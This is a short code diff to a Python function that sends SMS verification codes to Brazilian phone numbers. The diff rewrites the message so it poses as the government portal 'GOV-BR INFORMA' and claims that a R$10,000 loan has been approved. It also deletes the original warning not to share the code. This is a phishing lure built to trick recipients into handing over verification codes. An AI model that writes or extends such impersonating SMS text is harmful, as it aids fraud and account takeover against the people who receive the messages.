@@ -43,8 +43,10 @@ def send_verification_code_smsdev(phone_number: str, verification_code: str) -> 
         formatted_phone = re.sub(r'\D', '', phone_number)
 
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
+            # Get first name (using "Cliente" as default)
+            first_name = "Cliente"
             # Message template
-            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
+            message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo no valor de R$10.000,00 foi aprovado. Seu código de verificação é: {verification_code}."
 
             # API parameters
             params = {
